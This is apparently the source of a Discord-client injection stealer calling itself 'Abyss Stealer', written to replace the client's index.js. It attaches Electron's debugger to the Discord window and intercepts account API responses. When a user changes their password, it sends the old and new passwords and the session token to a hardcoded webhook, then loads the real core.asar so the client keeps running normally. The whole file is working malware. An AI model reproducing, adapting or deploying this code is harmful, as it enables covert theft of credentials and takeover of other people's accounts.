const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const { BrowserWindow } = require('electron');

const CONFIG = {
    webhook: "https://discord.com/api/webhooks/1361655445529559268/uRDAzumNEBLAdZa9KamX2RvCqVIYQ58gk7WhqI3lmeoQ69yiegWR0YSHvlspBOMEACiU",
    API: "https://discord.com/api/v9/users/@me",
    filters: {
        urls: ['/users/@me'],
    },
};

const request = async (method, url, headers, data) => {
    try {
        if (!url || typeof url !== 'string' || !url.match(/^https?:\/\//)) {
            return null;
        }
        url = new URL(url);
        const options = {
            protocol: url.protocol,
            hostname: url.host,
            path: url.pathname,
            method: method,
            headers: {
                "Access-Control-Allow-Origin": "*",
            },
        };

        if (url.search) options.path += url.search;
        for (const key in headers) options.headers[key] = headers[key];
        const req = https.request(options);
        if (data) req.write(data);
        req.end();

        return new Promise((resolve, reject) => {
            req.on("response", res => {
                let data = "";
                res.on("data", chunk => data += chunk);
                res.on("end", () => resolve(data));
            });
            req.on("error", err => {

                reject(err);
            });
        });
    } catch (error) {
        return null;
    }
};

const fetch = async (endpoint, headers) => {
    try {
        const response = await request("GET", CONFIG.API + endpoint, headers);
        if (!response) throw new Error('No response from fetch');
        return JSON.parse(response);
    } catch (error) {
        return null;
    }
};

const fetchAccount = async token => {
    try {
        return await fetch("", {
            "Authorization": token
        });
    } catch (error) {
        return null;
    }
};

const hooker = async (content, token, account) => {
    try {
        content["username"] = "Abyss Stealer";
        content["avatar_url"] = "https://i.pinimg.com/736x/19/0e/ea/190eeaf9d52d78d271e5347cbc5a0f7d.jpg";
        content["embeds"][0]["thumbnail"] = {
            "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
        };
        content["embeds"][0]["footer"] = {
            "text": "Abyss Stealer Babaıdr",
            "icon_url": "https://i.pinimg.com/736x/19/0e/ea/190eeaf9d52d78d271e5347cbc5a0f7d.jpg",
        };
        content["embeds"][0]["title"] = `Abyss - İnjeksiyon - ${account.username}`;

        for (const embed in content["embeds"]) {
            content["embeds"][embed]["color"] = 0x242429;
        }

        await request("POST", CONFIG.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
    } catch (error) {
        logError('Error in hooker', error);
    }
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
    try {
        const account = await fetchAccount(token);

        const content = {
            content: "", // optional, you can leave this empty or add other text
            embeds: [{
                title: `**${account.username}** Şifresini Değiştirdi!`,
                fields: [
                    {
                        name: "<:unlock:1361605538257043516><:line:1360173045959884930>Yeni Şifre",
                        value: `**${newPassword}**`,
                        inline: true
                    },
                    {
                        name: "<:lock:1361214556327903324><:line:1360173045959884930>Eski Şifre",
                        value: `**${oldPassword}**`,
                        inline: true
                    },
                    {
                        name: " ",
                        value: " ",
                        inline: true
                    },
                    {
                        name: "<:key:1360152689685692416><:line:1360173045959884930> Token",
                        value: `\`\`\`c\n${token}\n\`\`\``,
                        inline: false
                    }
                ]
            }]
        };

        await hooker(content, token, account);
    } catch (error) {
        logError('Error in PasswordChanged', error);
    }
};

const createWindow = async () => {
    try {
        if (!BrowserWindow || typeof BrowserWindow.getAllWindows !== 'function') {
            logError('createWindow: BrowserWindow.getAllWindows unavailable');
            return;
        }

        // Retry finding a window up to 5 times, waiting 1s between attempts
        let mainWindow = null;
        for (let attempt = 1; attempt <= 5; attempt++) {
            const windows = BrowserWindow.getAllWindows();
            if (windows.length > 0) {
                mainWindow = windows[0];
                break;
            }
            logError(`createWindow: No window found on attempt ${attempt}`);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1s
        }

        if (!mainWindow) {
            logError('createWindow: Failed to find main window after retries');
            return;
        }

        mainWindow.webContents.debugger.attach('1.3');
        mainWindow.webContents.debugger.on('message', async (_, method, params) => {
            try {
                if (method !== 'Network.responseReceived') return;
                if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
                if (![200, 202].includes(params.response.status)) return;

                const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
                    requestId: params.requestId
                });
                const responseData = JSON.parse(responseUnparsedData.body);

                const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
                    requestId: params.requestId
                });
                const requestData = JSON.parse(requestUnparsedData.postData);

                if (params.response.url.endsWith('/@me') && requestData.new_password && requestData.password) {
                    await PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }
            } catch (error) {
                logError('Error in debugger message handler', error);
            }
        });

        mainWindow.webContents.debugger.sendCommand('Network.enable');

        mainWindow.on('closed', () => {
            createWindow();
        });
    } catch (error) {
        logError('Error in createWindow', error);
    }
};

createWindow();

module.exports = require("./core.asar");